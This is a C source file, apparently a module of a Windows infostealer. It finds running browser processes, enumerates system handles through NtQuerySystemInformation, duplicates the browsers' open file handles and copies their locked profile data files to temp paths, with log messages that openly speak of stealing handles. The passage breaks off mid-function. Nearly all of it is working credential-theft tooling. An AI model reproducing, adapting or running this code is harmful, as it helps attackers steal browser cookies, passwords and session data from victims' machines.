#include "Common.h"


// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// Windows Definitions

#define STATUS_SUCCESS                  ((NTSTATUS)0x00000000L)
#define STATUS_INFO_LENGTH_MISMATCH     ((NTSTATUS)0xC0000004L)

#define NT_SUCCESS(STATUS)              (((NTSTATUS)(STATUS)) >= STATUS_SUCCESS)

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX
{
    PVOID       Object;
    ULONG_PTR   UniqueProcessId;
    ULONG_PTR   HandleValue;
    ULONG       GrantedAccess;
    USHORT      CreatorBackTraceIndex;
    USHORT      ObjectTypeIndex;
    ULONG       HandleAttributes;
    ULONG       Reserved;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX, * PSYSTEM_HANDLE_TABLE_ENTRY_INFO_EX;

typedef struct _SYSTEM_HANDLE_INFORMATION_EX
{
    ULONG_PTR                           NumberOfHandles;
    ULONG_PTR                           Reserved;
    SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX   Handles[1];
} SYSTEM_HANDLE_INFORMATION_EX, * PSYSTEM_HANDLE_INFORMATION_EX;

// https://ntdoc.m417z.com/system_information_class
typedef UINT SYSTEM_INFORMATION_CLASS;

#define SystemExtendedHandleInformation 64

// https://learn.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntquerysysteminformation
typedef NTSTATUS (NTAPI* fnNtQuerySystemInformation)(
    IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
    IN OUT PVOID                SystemInformation,
    IN ULONG                    SystemInformationLength,
    OUT PULONG                  ReturnLength OPTIONAL
);

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

#define PATH_CACHE_CAPACITY     32

typedef struct _PATH_CACHE_ENTRY 
{
    DWORD   dwOgDataFilePathHash;
    CHAR    szTmpDataFilePath[MAX_PATH];
} PATH_CACHE_ENTRY, *PPATH_CACHE_ENTRY;

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// Global Variables

static PATH_CACHE_ENTRY             g_PathCache[PATH_CACHE_CAPACITY]        = { 0 };
static DWORD                        g_dwPathCacheCount                      = 0x00;
static fnNtQuerySystemInformation   g_pNtQuerySystemInformation             = NULL;

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

static DWORD WINAPI ComputeFnv1aCharacterHash(IN LPCVOID pvString, IN BOOL bIsUnicode)
{
    DWORD   dwFnvHash       = 0x811C9DC5,
            dwCharValue     = 0x00;
    LPCSTR  pszAnsiPtr      = (LPCSTR)pvString;
    LPCWSTR pwszUnicodePtr  = (LPCWSTR)pvString;
    
    if (bIsUnicode)
    {
        while (*pwszUnicodePtr)
        {
            dwCharValue = (DWORD)*pwszUnicodePtr;
            
            dwFnvHash ^= dwCharValue;
            dwFnvHash *= 0x01000193;
            
            pwszUnicodePtr++;
        }
    }
    else
    {
        while (*pszAnsiPtr)
        {
            dwCharValue = (DWORD)((BYTE)*pszAnsiPtr);
            
            dwFnvHash ^= dwCharValue;
            dwFnvHash *= 0x01000193;
            
            pszAnsiPtr++;
        }
    }
    
    return dwFnvHash;
}

static DWORD WINAPI HashStringFnv1aCharA(IN LPCSTR pszString, IN BOOL bCaseInsensitive)
{
    LPSTR   pszLowerBuffer  = NULL;
    DWORD   dwLength        = 0x00,
            dwHash          = 0x00;

    if (!pszString) return 0x00;
    
    while (pszString[dwLength]) dwLength++;
    
    if (bCaseInsensitive)
    {
        if (!(pszLowerBuffer = (LPSTR)LocalAlloc(LPTR, dwLength + 1))) return 0;
        
        for (DWORD i = 0; i < dwLength; i++)
        {
            if (pszString[i] >= 'A' && pszString[i] <= 'Z')
                pszLowerBuffer[i] = pszString[i] + 32;
            else
                pszLowerBuffer[i] = pszString[i];
        }
        
        dwHash = ComputeFnv1aCharacterHash((LPCVOID)pszLowerBuffer, FALSE);
        LocalFree(pszLowerBuffer);
        return dwHash;
    }
    
    return ComputeFnv1aCharacterHash((LPCVOID)pszString, FALSE);
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

static BOOL EnumerateTargetProcesses(IN LPCWSTR pwszBrowserName, OUT PDWORD* ppdwPidArray, OUT PDWORD pdwPidCount)
{
#define INITIAL_PIDS_ARRAY_CAPACITY 16
#define PIDS_ARRAY_GROWTH_FACTOR    2

     HANDLE          hSnapshot          = INVALID_HANDLE_VALUE;
     PROCESSENTRY32W ProcessEntry32     = { 0 };
     PDWORD          pdwPids            = NULL,
                     pdwTemp            = NULL;
     DWORD           dwCount            = 0x00,
                     dwCapacity         = INITIAL_PIDS_ARRAY_CAPACITY,
                     dwCurrentProcId    = GetCurrentProcessId();
     BOOL            bResults           = FALSE;

     if (!pwszBrowserName || !ppdwPidArray || !pdwPidCount) return FALSE;

     *ppdwPidArray          = NULL;
     *pdwPidCount           = 0x00;
     ProcessEntry32.dwSize  = sizeof(PROCESSENTRY32W);

     if (!(pdwPids = (PDWORD)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwCapacity * sizeof(DWORD))))
     {
        DBGA("[!] HeapAlloc Failed With Error: %lu", GetLastError());
        return FALSE;
     }

     if ((hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0x00)) == INVALID_HANDLE_VALUE)
     {
        DBGA("[!] CreateToolhelp32Snapshot Failed With Error: %lu", GetLastError());
        goto _END_OF_FUNC;
     }

     if (!Process32FirstW(hSnapshot, &ProcessEntry32))
     {
         DBGA("[!] Process32First Failed With Error: %lu", GetLastError());
         goto _END_OF_FUNC;
     }

     do
     {
         // Case-insensitive substring to match "Chrome" in "chrome.exe"
         if (StrStrIW(ProcessEntry32.szExeFile, pwszBrowserName))
         {
             // Skip Current Process 
             if (dwCurrentProcId == ProcessEntry32.th32ProcessID)
                 continue;

             // Expand if Required
             if (dwCount >= dwCapacity)
             {
                 dwCapacity *= PIDS_ARRAY_GROWTH_FACTOR;

                 if (!(pdwTemp = (PDWORD)HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, pdwPids, dwCapacity * sizeof(DWORD))))
                 {
                     DBGA("[!] HeapReAlloc Failed With Error: %lu", GetLastError());
                     goto _END_OF_FUNC;
                 }

                 pdwPids = pdwTemp;
             }

             pdwPids[dwCount++] = ProcessEntry32.th32ProcessID;
         }

     } while (Process32NextW(hSnapshot, &ProcessEntry32));

     *ppdwPidArray  = pdwPids;
     *pdwPidCount   = dwCount;
     bResults       = TRUE;    

#undef INITIAL_PIDS_ARRAY_CAPACITY
#undef PIDS_ARRAY_GROWTH_FACTOR

_END_OF_FUNC:
    if (hSnapshot != INVALID_HANDLE_VALUE && hSnapshot)
        CloseHandle(hSnapshot);
    if (!bResults && pdwPids)
        HeapFree(GetProcessHeap(), 0x00, pdwPids);
    return bResults;
}

static BOOL EndsWithW(IN LPCWSTR pszString, IN USHORT usStringLenBytes, IN LPCWSTR pszSuffix)
{
    SIZE_T cchString = usStringLenBytes / sizeof(WCHAR); 
    SIZE_T cchSuffix = lstrlenW(pszSuffix);

    if (cchSuffix > cchString) return FALSE;

    return (StrCmpNIW(pszString + cchString - cchSuffix, pszSuffix, (int)cchSuffix) == 0);
}

static BOOL DuplicateTargetHandle(IN DWORD dwProcessId, IN USHORT usHandleValue, OUT PHANDLE phDuplicatedHandle) 
{
    HANDLE hProcess = NULL;
    
    if (!(hProcess = OpenProcess(PROCESS_DUP_HANDLE, FALSE, dwProcessId)))
    {
        // DBGA("[!] OpenProcess Failed With Error: %lu", GetLastError());
        return FALSE;
    }

    if (!DuplicateHandle(hProcess, (HANDLE)(ULONG_PTR)usHandleValue, GetCurrentProcess(), phDuplicatedHandle, 0x00, FALSE, DUPLICATE_SAME_ACCESS)) 
    {
        // DBGA("[!] DuplicateHandle Failed With Error: %lu", GetLastError());
        CloseHandle(hProcess);
        return FALSE;
    }

    CloseHandle(hProcess);
    return TRUE;
}

static BOOL FindAndDuplicateFileHandle(IN PDWORD pdwPidArray, IN DWORD dwPidCount, IN LPCWSTR pwszFilePath, OUT PHANDLE phDuplicatedHandle)
{
    PSYSTEM_HANDLE_INFORMATION_EX   pHandleInfo         = NULL;
    PFILE_NAME_INFO                 pFileNameInfo       = NULL;
    HANDLE                          hDuplicatedHandle   = NULL,
                                    hProcess            = NULL;
    ULONG                           ulBufferSize        = BUFFER_SIZE_8192,
                                    ulReturnLength      = 0x00,
                                    ulFileInfoSize      = sizeof(FILE_NAME_INFO) + (MAX_PATH * sizeof(WCHAR));
    ULONG_PTR                       ulLastPid           = 0x00;
    NTSTATUS                        ntSTATUS            = 0x00;
    BOOL                            bResult             = FALSE;

    if (!pdwPidArray || !dwPidCount || !pwszFilePath || !phDuplicatedHandle)
        return FALSE;

    *phDuplicatedHandle = NULL;

    if (!(pFileNameInfo = (PFILE_NAME_INFO)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, ulFileInfoSize)))
    {
        DBGA("[!] HeapAlloc Failed With Error: %lu", GetLastError());
        return FALSE;
    }

    while (TRUE)
    {
        if (!(pHandleInfo = (PSYSTEM_HANDLE_INFORMATION_EX)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, ulBufferSize)))
        {
            DBGA("[!] HeapAlloc Failed With Error: %lu", GetLastError());
            goto _END_OF_FUNC;
        }

        if ((ntSTATUS = g_pNtQuerySystemInformation(SystemExtendedHandleInformation, pHandleInfo, ulBufferSize, &ulReturnLength)) == STATUS_INFO_LENGTH_MISMATCH)
        {
            HEAP_FREE(pHandleInfo);
#define GROWTH_FACTOR 2
            ulBufferSize = ulReturnLength * GROWTH_FACTOR;
#undef GROWTH_FACTOR
            continue;
        }

        if (!NT_SUCCESS(ntSTATUS))
        {
            DBGA("[!] NtQuerySystemInformation Failed With Error: 0x%0.8X", ntSTATUS);
            goto _END_OF_FUNC;
        }

        break;
    }

    __try
    {
        for (ULONG_PTR i = 0; i < pHandleInfo->NumberOfHandles && !bResult; i++)
        {
            PSYSTEM_HANDLE_TABLE_ENTRY_INFO_EX  pEntry = &pHandleInfo->Handles[i];
            BOOL                                bTargetProcess = FALSE;

            if (!(pEntry->GrantedAccess & FILE_READ_DATA))
                continue;

            for (DWORD j = 0; j < dwPidCount; j++)
            {
                if (pEntry->UniqueProcessId == (ULONG_PTR)pdwPidArray[j])
                {
                    bTargetProcess = TRUE;
                    break;
                }
            }
            if (!bTargetProcess) continue;

            if (pEntry->UniqueProcessId != ulLastPid)
            {
                if (hProcess) CloseHandle(hProcess);

                hProcess = OpenProcess(PROCESS_DUP_HANDLE, FALSE, (DWORD)pEntry->UniqueProcessId);
                ulLastPid = pEntry->UniqueProcessId;
            }

            if (!hProcess) continue;

            if (!DuplicateHandle(hProcess, (HANDLE)pEntry->HandleValue, GetCurrentProcess(), &hDuplicatedHandle, 0x00, FALSE, DUPLICATE_SAME_ACCESS))
                continue;

            if (GetFileType(hDuplicatedHandle) != FILE_TYPE_DISK)
            {
                CloseHandle(hDuplicatedHandle);
                hDuplicatedHandle = NULL;
                continue;
            }

            RtlSecureZeroMemory(pFileNameInfo, ulFileInfoSize);

            if (!GetFileInformationByHandleEx(hDuplicatedHandle, FileNameInfo, pFileNameInfo, ulFileInfoSize))
            {
                CloseHandle(hDuplicatedHandle);
                hDuplicatedHandle = NULL;
                continue;
            }

            if (EndsWithW(pFileNameInfo->FileName, (USHORT)pFileNameInfo->FileNameLength, pwszFilePath))
            {
                DBGV("[i] Found Target File Handle In Process: %lu", (ULONG)pEntry->UniqueProcessId);
                *phDuplicatedHandle = hDuplicatedHandle;
                bResult = TRUE;
            }
            else
            {
                CloseHandle(hDuplicatedHandle);
                hDuplicatedHandle = NULL;
            }
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        DBGA("[!] Exception During Handle Enumeration With Error Code: 0x%08X", GetExceptionCode());
    }


_END_OF_FUNC:
    if (hProcess)
        CloseHandle(hProcess);
    HEAP_FREE(pHandleInfo);
    HEAP_FREE(pFileNameInfo);
    return bResult;
}

static BOOL FindAndDuplicateFileHandleEx(IN PDWORD pdwPidArray, IN DWORD dwPidCount, IN LPCWSTR* ppwszFilePaths,IN DWORD dwFileCount, OUT PHANDLE phDuplicatedHandles)
{
    PSYSTEM_HANDLE_INFORMATION_EX   pHandleInfo         = NULL;
    PFILE_NAME_INFO                 pFileNameInfo       = NULL;
    HANDLE                          hDuplicatedHandle   = NULL,
                                    hProcess            = NULL;
    ULONG                           ulBufferSize        = BUFFER_SIZE_8192,
                                    ulReturnLength      = 0x00,
                                    ulFileInfoSize      = sizeof(FILE_NAME_INFO) + (MAX_PATH * sizeof(WCHAR));
    ULONG_PTR                       ulLastPid           = 0x00;
    NTSTATUS                        ntSTATUS            = 0x00;
    DWORD                           dwFoundCount        = 0x00;

    if (!pdwPidArray || !dwPidCount || !ppwszFilePaths || !dwFileCount || !phDuplicatedHandles)
        return FALSE;

    for (DWORD i = 0; i < dwFileCount; i++)
        phDuplicatedHandles[i] = NULL;

    if (!(pFileNameInfo = (PFILE_NAME_INFO)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, ulFileInfoSize)))
    {
        DBGA("[!] HeapAlloc Failed With Error: %lu", GetLastError());
        return FALSE;
    }

    while (TRUE)
    {
        if (!(pHandleInfo = (PSYSTEM_HANDLE_INFORMATION_EX)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, ulBufferSize)))
        {
            DBGA("[!] HeapAlloc Failed With Error: %lu", GetLastError());
            goto _END_OF_FUNC;
        }

        if ((ntSTATUS = g_pNtQuerySystemInformation(SystemExtendedHandleInformation, pHandleInfo, ulBufferSize, &ulReturnLength)) == STATUS_INFO_LENGTH_MISMATCH)
        {
            HEAP_FREE(pHandleInfo);
#define GROWTH_FACTOR 2
            ulBufferSize = ulReturnLength * GROWTH_FACTOR;
#undef GROWTH_FACTOR
            continue;
        }

        if (!NT_SUCCESS(ntSTATUS))
        {
            DBGA("[!] NtQuerySystemInformation Failed With Error: 0x%0.8X", ntSTATUS);
            goto _END_OF_FUNC;
        }

        break;
    }

    __try
    {
        for (ULONG_PTR i = 0; i < pHandleInfo->NumberOfHandles && dwFoundCount < dwFileCount; i++)
        {
            PSYSTEM_HANDLE_TABLE_ENTRY_INFO_EX  pEntry              = &pHandleInfo->Handles[i];
            BOOL                                bTargetProcess      = FALSE,
                                                bMatched            = FALSE;

            if (!(pEntry->GrantedAccess & FILE_READ_DATA))
                continue;

            for (DWORD j = 0; j < dwPidCount; j++)
            {
                if (pEntry->UniqueProcessId == (ULONG_PTR)pdwPidArray[j])
                {
                    bTargetProcess = TRUE;
                    break;
                }
            }
            if (!bTargetProcess) continue;

            if (pEntry->UniqueProcessId != ulLastPid)
            {
                if (hProcess) CloseHandle(hProcess);

                hProcess  = OpenProcess(PROCESS_DUP_HANDLE, FALSE, (DWORD)pEntry->UniqueProcessId);
                ulLastPid = pEntry->UniqueProcessId;
            }

            if (!hProcess) continue;

            if (!DuplicateHandle(hProcess, (HANDLE)pEntry->HandleValue, GetCurrentProcess(), &hDuplicatedHandle, 0x00, FALSE, DUPLICATE_SAME_ACCESS))
                continue;

            if (GetFileType(hDuplicatedHandle) != FILE_TYPE_DISK)
            {
                CloseHandle(hDuplicatedHandle);
                hDuplicatedHandle = NULL;
                continue;
            }

            RtlSecureZeroMemory(pFileNameInfo, ulFileInfoSize);

            if (!GetFileInformationByHandleEx(hDuplicatedHandle, FileNameInfo, pFileNameInfo, ulFileInfoSize))
            {
                CloseHandle(hDuplicatedHandle);
                hDuplicatedHandle = NULL;
                continue;
            }

            // Check against all target files that haven't been found yet
            for (DWORD k = 0; k < dwFileCount; k++)
            {
                if (phDuplicatedHandles[k] != NULL)
                    continue; 

                if (EndsWithW(pFileNameInfo->FileName, (USHORT)pFileNameInfo->FileNameLength, ppwszFilePaths[k]))
                {
                    DBGV("[i] Found Target File Handle In Process: %lu", (ULONG)pEntry->UniqueProcessId);
                    phDuplicatedHandles[k] = hDuplicatedHandle;
                    dwFoundCount++;
                    bMatched = TRUE;
                    break;
                }
            }

            if (!bMatched)
            {
                CloseHandle(hDuplicatedHandle);
                hDuplicatedHandle = NULL;
            }
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        DBGA("[!] Exception During Handle Enumeration With Error Code: 0x%08X", GetExceptionCode());
    }

_END_OF_FUNC:
    if (hProcess)
        CloseHandle(hProcess);
    HEAP_FREE(pHandleInfo);
    HEAP_FREE(pFileNameInfo);
    return (dwFoundCount > 0);
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

static BOOL CopyFileViaHandle(IN HANDLE hSourceFile, IN LPCSTR pszDestPath)
{
    HANDLE  hDestFile       = INVALID_HANDLE_VALUE;
    PBYTE   pBuffer         = NULL;
    DWORD   dwBytesRead     = 0x00,
            dwBytesWritten  = 0x00;
    BOOL    bResult         = FALSE;

    if (!hSourceFile || hSourceFile == INVALID_HANDLE_VALUE || !pszDestPath)
        return FALSE;

    if (!(pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, BUFFER_SIZE_8192)))
    {
        DBGA("[!] HeapAlloc Failed With Error: %lu", GetLastError());
        return FALSE;
    }

    if ((hDestFile = CreateFileA(pszDestPath, GENERIC_WRITE, 0x00, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE)
    {
        DBGA("[!] CreateFileA Failed With Error: %lu", GetLastError());
        HEAP_FREE(pBuffer);
        return FALSE;
    }

    if (SetFilePointer(hSourceFile, 0x00, NULL, FILE_BEGIN) == INVALID_SET_FILE_POINTER && GetLastError() != NO_ERROR)
    {
        DBGA("[!] SetFilePointer Failed With Error: %lu", GetLastError());
        goto _END_OF_FUNC;
    }

    while (ReadFile(hSourceFile, pBuffer, BUFFER_SIZE_8192, &dwBytesRead, NULL) && dwBytesRead > 0x00)
    {
        if (!WriteFile(hDestFile, pBuffer, dwBytesRead, &dwBytesWritten, NULL) || dwBytesWritten != dwBytesRead)
        {
            DBGA("[!] WriteFile Failed With Error: %lu", GetLastError());
            DBGA("[i] Wrote %lu Of %lu", dwBytesWritten, dwBytesRead);
            goto _END_OF_FUNC;
        }
    }

    bResult = TRUE;

_END_OF_FUNC:
    if (hDestFile != INVALID_HANDLE_VALUE)
        CloseHandle(hDestFile);
    HEAP_FREE(pBuffer);
    return bResult;
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

static LPSTR GetAppDataFilePath(IN LPCSTR pszEnvName, IN LPCSTR pszRelPath)
{
    CHAR    szFullPath[BUFFER_SIZE_512]     = { 0 };
    CHAR    szAppDataFile[MAX_PATH]         = { 0 };
    DWORD   dwAttributes                    = 0x00;

    if (!pszRelPath) return NULL;

    if (!GetEnvironmentVariableA(pszEnvName, szAppDataFile, MAX_PATH))
    {
        DBGA("[!] GetEnvironmentVariableA Failed With Error: %lu", GetLastError());
        return NULL;
    }

    if (FAILED(StringCchPrintfA(szFullPath, BUFFER_SIZE_512, "%s\\%s", szAppDataFile, pszRelPath)))
        return NULL;

    if ((dwAttributes = GetFileAttributesA(szFullPath)) == INVALID_FILE_ATTRIBUTES || (dwAttributes & FILE_ATTRIBUTE_DIRECTORY))
        return NULL;

    return DuplicateAnsiString(szFullPath);
}

LPSTR GetBrowserDataFilePath(IN BROWSER_TYPE Browser, IN LPCSTR pszRelPath)
{
    CHAR    szTempDir[MAX_PATH]     = { 0 };
    CHAR    szTempFile[MAX_PATH]    = { 0 };
    HANDLE  hDuplicatedHandle       = NULL;
    PDWORD  pdwPidArray             = NULL;
    DWORD   dwPidCount              = 0x00,
            dwDataFilePathHash      = 0x00;
    LPSTR   szFilePath              = NULL;
    BOOL    bCopiedViaHandle        = FALSE;

    if (!(szFilePath = GetAppDataFilePath("LOCALAPPDATA", pszRelPath)))
    {
        if (!(szFilePath = GetAppDataFilePath("APPDATA", pszRelPath)))
        {
            DBGA("[!] Failed To Locate File: %s", pszRelPath);
            return NULL;
        }
    }

    // Check Cache
    if ((dwDataFilePathHash = HashStringFnv1aCharA(szFilePath, TRUE)))
    {
        for (DWORD i = 0; i < g_dwPathCacheCount; i++)
        {
            if (dwDataFilePathHash == g_PathCache[i].dwOgDataFilePathHash)
            {
                HEAP_FREE(szFilePath);
                DBGV("[v] Data File Fetched From Cache");
                return DuplicateAnsiString(g_PathCache[i].szTmpDataFilePath);
            }
        }
    }

    if (!GetTempPathA(MAX_PATH, szTempDir))
    {
        DBGA("[!] GetTempPathA Failed With Error: %lu", GetLastError());
        HEAP_FREE(szFilePath);
        return NULL;
    }

    if (!GetTempFileNameA(szTempDir, "tmp", 0, szTempFile))
    {
        DBGA("[!] GetTempFileNameA Failed With Error: %lu", GetLastError());
        HEAP_FREE(szFilePath);
        return NULL;
    }

    // Try handle duplication if browser is running
    do
    {
        WCHAR   wszRelPath[MAX_PATH]        = { 0 };
        WCHAR   wszBrowserName[MAX_PATH]    = { 0 };

        if (!g_pNtQuerySystemInformation)
        {
            if (!(g_pNtQuerySystemInformation = (fnNtQuerySystemInformation)GetProcAddress(GetModuleHandle(TEXT("NTDLL")), "NtQuerySystemInformation")))
            {
                DBGA("[!] GetProcAddress Failed With Error: %lu", GetLastError());
                break;
            }
        }

        if (!MultiByteToWideChar(CP_ACP, 0x00, GetBrowserProcessName(Browser), -1, wszBrowserName, MAX_PATH))
            break;

        if (!EnumerateTargetProcesses(wszBrowserName, &pdwPidArray, &dwPidCount) || dwPidCount == 0x00)
            break;

        DBGV("[i] Found %lu Running Browser Processes", dwPidCount);
        DBGV("[v] Attempting To Steal Opened File Handles...");

        if (!MultiByteToWideChar(CP_ACP, 0x00, pszRelPath, -1, wszRelPath, MAX_PATH))
            break;

        if (!FindAndDuplicateFileHandle(pdwPidArray, dwPidCount, wszRelPath, &hDuplicatedHandle))
            break;

        if (CopyFileViaHandle(hDuplicatedHandle, szTempFile))
        {
            DBGV("[v] Successfully Copied File Via Duplicated Handle");
            bCopiedViaHandle = TRUE;
        }

    } while (0);

    if (hDuplicatedHandle) CloseHandle(hDuplicatedHandle);
    
    HEAP_FREE(pdwPidArray);

    if (!bCopiedViaHandle)
    {
        DBGV("[v] Target File Handle Was Not Found, Falling Back To CopyFileA");

        if (!CopyFileA(szFilePath, szTempFile, FALSE))
        {
            DBGA("[!] CopyFileA Failed With Error: %lu", GetLastError());
            DeleteFileA(szTempFile);
            HEAP_FREE(szFilePath);
            return NULL;
        }
    }

    // Add To Cache
    if (g_dwPathCacheCount < PATH_CACHE_CAPACITY)
    {
        StringCchCopyA(g_PathCache[g_dwPathCacheCount].szTmpDataFilePath, MAX_PATH, szTempFile);
        g_PathCache[g_dwPathCacheCount].dwOgDataFilePathHash = HashStringFnv1aCharA(szFilePath, TRUE);
        g_dwPathCacheCount++;
    }

    HEAP_FREE(szFilePath);

    return DuplicateAnsiString(szTempFile);
}

DWORD GetBrowserDataFilePathEx(IN BROWSER_TYPE Browser, IN LPCSTR* ppszRelPaths, IN DWORD dwFileCount)
{
    CHAR        szTempDir[MAX_PATH]         = { 0 };
    CHAR        szTempFile[MAX_PATH]        = { 0 };
    WCHAR       wszBrowserName[MAX_PATH]    = { 0 };
    PDWORD      pdwPidArray                 = NULL;
    PHANDLE     phDuplicatedHandles         = NULL;
    LPWSTR*     ppwszRelPaths               = NULL;
    DWORD       dwPidCount                  = 0x00,
                dwSuccessCount              = 0x00;

    if (!ppszRelPaths || dwFileCount == 0)
        return 0;

    if (!GetTempPathA(MAX_PATH, szTempDir))
    {
        DBGA("[!] GetTempPathA Failed With Error: %lu", GetLastError());
        return 0;
    }

    // Allocate arrays for wide paths and handles
    if (!(ppwszRelPaths = (LPWSTR*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwFileCount * sizeof(LPWSTR))))
    {
        DBGA("[!] HeapAlloc Failed With Error: %lu", GetLastError());
        return 0;
    }

    if (!(phDuplicatedHandles = (PHANDLE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwFileCount * sizeof(HANDLE))))
    {
        DBGA("[!] HeapAlloc Failed With Error: %lu", GetLastError());
        HEAP_FREE(ppwszRelPaths);
        return 0;
    }

    // Convert all paths to wide strings
    for (DWORD i = 0; i < dwFileCount; i++)
    {
        if (!(ppwszRelPaths[i] = (LPWSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, MAX_PATH * sizeof(WCHAR))))
            continue;

        MultiByteToWideChar(CP_ACP, 0x00, ppszRelPaths[i], -1, ppwszRelPaths[i], MAX_PATH);
    }

    // Enumerate browser processes and duplicate all handles at once
    do
    {
        if (!g_pNtQuerySystemInformation)
        {
            if (!(g_pNtQuerySystemInformation = (fnNtQuerySystemInformation)GetProcAddress(GetModuleHandle(TEXT("NTDLL")), "NtQuerySystemInformation")))
            {
                DBGA("[!] GetProcAddress Failed With Error: %lu", GetLastError());
                break;
            }
        }

        if (!MultiByteToWideChar(CP_ACP, 0x00, GetBrowserProcessName(Browser), -1, wszBrowserName, MAX_PATH))
            break;

        if (!EnumerateTargetProcesses(wszBrowserName, &pdwPidArray, &dwPidCount) || dwPidCount == 0x00)
            break;

        DBGV("[i] Found %lu Running Browser Processes", dwPidCount);
        DBGV("[v] Attempting To Steal Opened File Handles...");

        FindAndDuplicateFileHandleEx(pdwPidArray, dwPidCount, (LPCWSTR*)ppwszRelPaths, dwFileCount, phDuplicatedHandles);

    } while (0);

    // Process each file
    for (DWORD i = 0; i < dwFileCount; i++)
    {
        LPSTR   szFilePath          = NULL;
        DWORD   dwDataFilePathHash  = 0x00;
        BOOL    bCopiedViaHandle    = FALSE;

        if (!(szFilePath = GetAppDataFilePath("LOCALAPPDATA", ppszRelPaths[i])))
        {
            if (!(szFilePath = GetAppDataFilePath("APPDATA", ppszRelPaths[i])))
            {
                DBGA("[!] Failed To Locate File: %s", ppszRelPaths[i]);
                continue;
            }
        }

        // Skip if already cached
        if ((dwDataFilePathHash = HashStringFnv1aCharA(szFilePath, TRUE)))
        {
            BOOL bFoundInCache = FALSE;

            for (DWORD j = 0; j < g_dwPathCacheCount; j++)
            {
                if (dwDataFilePathHash == g_PathCache[j].dwOgDataFilePathHash)
                {
                    DBGV("[v] Data File Fetched From Cache");
                    bFoundInCache = TRUE;
                    dwSuccessCount++;
                    break;
                }
            }

            if (bFoundInCache)
            {
                HEAP_FREE(szFilePath);
                if (phDuplicatedHandles[i]) CloseHandle(phDuplicatedHandles[i]);
                continue;
            }
        }

        if (!GetTempFileNameA(szTempDir, "tmp", 0, szTempFile))
        {
            DBGA("[!] GetTempFileNameA Failed With Error: %lu", GetLastError());
            HEAP_FREE(szFilePath);
            if (phDuplicatedHandles[i]) CloseHandle(phDuplicatedHandles[i]);
            continue;
        }

        // Try handle duplication if we got a handle for this file
        if (phDuplicatedHandles[i])
        {
            if (CopyFileViaHandle(phDuplicatedHandles[i], szTempFile))
            {
                DBGV("[v] Successfully Copied File Via Duplicated Handle");
                bCopiedViaHandle = TRUE;
            }
            CloseHandle(phDuplicatedHandles[i]);
        }

        // Fallback to CopyFileA
        if (!bCopiedViaHandle)
        {
            DBGV("[v] Target File Handle Was Not Found, Falling Back To CopyFileA");

            if (!CopyFileA(szFilePath, szTempFile, FALSE))
            {
                DBGA("[!] CopyFileA Failed With Error: %lu", GetLastError());
                DeleteFileA(szTempFile);
                HEAP_FREE(szFilePath);
                continue;
            }
        }

        // Add To Cache
        if (g_dwPathCacheCount < PATH_CACHE_CAPACITY)
        {
            StringCchCopyA(g_PathCache[g_dwPathCacheCount].szTmpDataFilePath, MAX_PATH, szTempFile);
            g_PathCache[g_dwPathCacheCount].dwOgDataFilePathHash = dwDataFilePathHash;
            g_dwPathCacheCount++;
            dwSuccessCount++;
        }

        HEAP_FREE(szFilePath);
    }

    HEAP_FREE(pdwPidArray);
    HEAP_FREE(phDuplicatedHandles);

    for (DWORD i = 0; i < dwFileCount; i++)
        HEAP_FREE(ppwszRelPaths[i]);

    HEAP_FREE(ppwszRelPaths);

    // DBGA("[i] Batch Complete: %lu/%lu Files", dwSuccessCount, dwFileCount);

    return dwSuccessCount;
}

VOID DeleteDataFilesCache()
{
    for (DWORD i = 0; i < g_dwPathCacheCount; i++)
    {
        if (g_PathCache[i].szTmpDataFilePath[0])
